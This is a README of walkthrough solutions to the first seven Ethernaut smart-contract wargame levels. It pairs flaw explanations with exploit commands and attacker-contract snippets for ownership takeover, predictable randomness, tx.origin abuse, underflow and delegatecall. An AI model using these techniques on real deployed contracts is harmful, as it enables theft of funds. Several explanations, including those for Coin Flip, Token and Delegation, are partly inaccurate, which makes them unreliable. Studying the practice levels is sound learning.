# Ethernaut Solutions

Solution to the Ethernaut challenges!

## 00 - Hello Ethernaut

For Reference -> [Challenge](./questions/1.Hello_Ethernaut.sol) | [Solution](./answers/1.Hello_Ethernaut.js)

This one's a warm-up. All you have to do is call `info()`, if still confused then check the solution.

## 01 - Fallback

For Reference -> [Challenge](./questions/2.Fallback.sol) | [Solution](./answers/2.Fallback.js)

Here I used the browser's console to solve this challenge. We are going to take the advantage of `receive` function after which some ether could be sent to the contract and we will become the owner.

1. First, let's contribute a small amount less than 0.001 ether after converting ether to wei using `toWei` function within the console itself.

```javascript
    toWei(".0001") // 100000000000000

    await contract.contribute({value: 100000000000000})
```

2. Now, send some ether into the contract by taking advantage of the `receive` function.

```javascript
    await contract.sendTransaction({value: 1})
```

3. Finally, check for the owner whether it's you or not and upon confirmation withdraw the funds

```javascript
    await contract.owner()
    await contract.withdraw()
```

4. At last submit the instance

## 02 - Fallout

For Reference -> [Challenge](./questions/3.Fallout.sol) | [Solution](./answers/3.Fallout.js)

There's a blunder in the constructor name itself as it doesn't matches with the contract name.

Just call the `Fal1out` function and you will be the owner.

```javascript
    await contract.Fal1out()
```

## 03 - Coin Flip

For Reference -> [Challenge](./questions/4.Coin_Flip.sol) | [Solution](./answers/4.Coin_Flip.sol)

This challenge needs us to deploy a attack contract which will always win the coin flip. The contract is already provided in the [solution](./answers/4.Coin_Flip.sol) file. Although, it's well explained under the solution file itself but still let me walk you through the main `attack` function.

The reason why we are able to win the coin flip is because the `blockhash` function is used to calculate the `blockValue` and the `blockhash` function is only able to access the last 256 blocks. So, if we call the `attack` function multiple times in the same block, the `blockhash` function will return the same value and hence the `coinFlip` will be the same.

1. The `attack` function looks like this:

```solidity
    function attack() external {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
```

2. At first, we calculate the `blockValue` by using the `blockhash` function.

3. Then, we calculate the `coinFlip` by dividing the `blockValue` with the `FACTOR` which is 57896044618658097711785492504343953926634992332820282019728792003956564819968

4. Then we calculate the `side` by checking if the `coinFlip` is equal to 1 or not.

5. Finally, we call the `flip` function of the `coinflip` contract with the `side` as the argument.

6. Remember to call the `attack` function 10 times in order to win the challenge.

## 04 - Telephone

For Reference -> [Challenge](./questions/5.Telephone.sol) | [Solution](./answers/5.Telephone.sol)

All we need is to call the `attack` function within the [Solution](./answers/5.Telephone.sol) contract after deploying it.

```solidity
    function attack() public {
        telephone.changeOwner(address(this));
    }
```

The reason this works is because of the vulnerable condition - `(tx.origin != msg.sender)` in the `changeOwner` function of the `Telephone` contract. The `tx.origin` is the original sender of the transaction and `msg.sender` is the current sender of the transaction. So, when we call the `attack` function, the `msg.sender` is the address of the `Solution` contract and the `tx.origin` is the address of the EOA. Hence, the condition `(tx.origin != msg.sender)` is true and the `changeOwner` function is executed.

## 05 - Token

For Reference -> [Challenge](./questions/6.Token.sol) | [Solution](./answers/6.Token.js)

To crack this challenge, one need to have a knowledge of underflows and overflows...
Now, here we have 20 tokens and if we send someone 21 tokens which seems kind of impossible but wait, we are using `uint` here that means it can go negative and hence the balance will be 2^256 - 21 which is a huge number and hence the balance will be huge.

If we look at `transfer` function below:

```solidity
    function transfer(address _to, uint _value) public returns(bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

Here, if we call the `transfer` function with `_to` as someone's address and `_value` as 21, then `20 - 21 -> -1 <=> 2^256` and hence the balance will be huge.

1. Let's first check our current balance which gonna be 20 tokens

```javascript
    await contract.balanceOf(player)
```

2. Now transfer 21 tokens to someone's address

```javascript
    await contract.transfer("anyone-address", 21)
```

## 06 - Delegation

For Reference -> [Challenge](./questions/7.Delegation.sol) | [Solution](./answers/7.Delegation.js)

This is an interesting challenge and for this you need to have certain knowledge of how delegate calls works and can be manipulated in phase of vulnerability.
An interesting activity is provided in [Bonus](/Ethernaut/Bonus/DelegateCalls/) section which will help you understand a little concept about delegate calls. Research on your own basis will be helpful.

Now, let's come to the challenge:

1. First, we need to check which contract we are interacting with - `Delegate` or `Delegation`.

```shell
    contract.abi
```

2. Now we will make a variable that contains our call to `pwn` and then that call will send through an transaction to the `Delegation` contract. As `Delegation` contract contains a `fallback` function that usually take any transaction and then delegate it to the `Delegate` contract.

```javascript
    var pwned = web3.utils.keccak256("pwn()")
    await contract.sendTransaction(pwned)
```

3. At last, check the owner and submit!

```javascript
    await contract.owner()
```

## Contributing

Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
